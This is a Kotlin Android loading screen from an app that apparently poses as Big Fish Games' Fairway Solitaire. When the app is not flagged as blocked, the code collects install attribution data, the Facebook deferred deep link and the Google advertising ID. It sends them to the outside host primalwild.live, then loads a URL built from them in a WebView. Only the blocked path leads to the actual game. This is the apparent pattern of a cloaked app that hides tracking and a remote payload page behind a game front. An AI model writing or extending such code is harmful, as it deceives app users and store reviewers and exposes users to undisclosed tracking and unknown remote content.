package com.bigfishgames.fairwaysolitaireuniversalf2pgoogl.wild_loading

import android.content.Intent
import android.os.Bundle
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import com.bigfishgames.fairwaysolitaireuniversalf2pgoogl.AppsType
import com.bigfishgames.fairwaysolitaireuniversalf2pgoogl.Settings
import com.bigfishgames.fairwaysolitaireuniversalf2pgoogl.WildApplication
import com.bigfishgames.fairwaysolitaireuniversalf2pgoogl.databinding.LoadingWildBinding
import com.bigfishgames.fairwaysolitaireuniversalf2pgoogl.wild_data.CompleteData
import com.bigfishgames.fairwaysolitaireuniversalf2pgoogl.wild_data.isComplete
import com.bigfishgames.fairwaysolitaireuniversalf2pgoogl.wild_data.wrappers.createUrl
import com.bigfishgames.fairwaysolitaireuniversalf2pgoogl.wild_data.wrappers.notify
import com.bigfishgames.fairwaysolitaireuniversalf2pgoogl.wild_game.WildGame
import com.bigfishgames.fairwaysolitaireuniversalf2pgoogl.wild_repository.WildRepository
import com.bigfishgames.fairwaysolitaireuniversalf2pgoogl.wild_web.WildWebView
import com.facebook.applinks.AppLinkData
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import kotlin.coroutines.resume
import kotlin.coroutines.suspendCoroutine

class WildLoading : AppCompatActivity() {
    private lateinit var binding: LoadingWildBinding
    private var completeData: CompleteData = CompleteData()
    private lateinit var repository: WildRepository

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = LoadingWildBinding.inflate(layoutInflater)
        setContentView(binding.root)
        repository = WildRepository(this, BASE)

        if (Settings.blocked(this)) {
            startActivity(Intent(this, WildGame::class.java))
            finish()
        } else {
            (application as WildApplication).appsResult.observe(this) { apps ->
                lifecycleScope.launch {
                    val currentUrl = if (apps?.get("is_first_launch") as Boolean) {
                        createAndNotify(apps)
                    } else {
                        val str = repository.load()
                        if (str.contains(BASE)) {
                            createAndNotify(apps)
                        } else {
                            str
                        }
                    }
                    Log.d("YYY", "Current url = $currentUrl")
                    with(Intent(this@WildLoading, WildWebView::class.java)) {
                        putExtra("currentUrl", currentUrl)
                        putExtra("base", BASE)
                        startActivity(this)
                        finish()
                    }
                }
            }
        }
    }

    private suspend fun complete(apps: AppsType): CompleteData =
        completeData.copy(
            appsData = Pair(apps, true),
            deepLink = Pair(
                suspendCoroutine { cont ->
                    AppLinkData.fetchDeferredAppLinkData(this) { data ->
                        cont.resume(data?.targetUri.toString())
                    }
                }, true
            ),
            googleId = Pair(
                withContext(Dispatchers.Default) {
                    @Suppress("BlockingMethodInNonBlockingContext")
                    AdvertisingIdClient.getAdvertisingIdInfo(this@WildLoading).id.toString()
                }, true
            )
        )

    private suspend fun createAndNotify(appsData: AppsType): String {
        completeData = complete(appsData)
        return if (completeData.isComplete()) {
            notify(completeData, this@WildLoading)
            createUrl(completeData, BASE, this@WildLoading)
        } else {
            BASE
        }
    }

    companion object {
        private const val BASE = "https://primalwild.live/priimal.php"
    }
}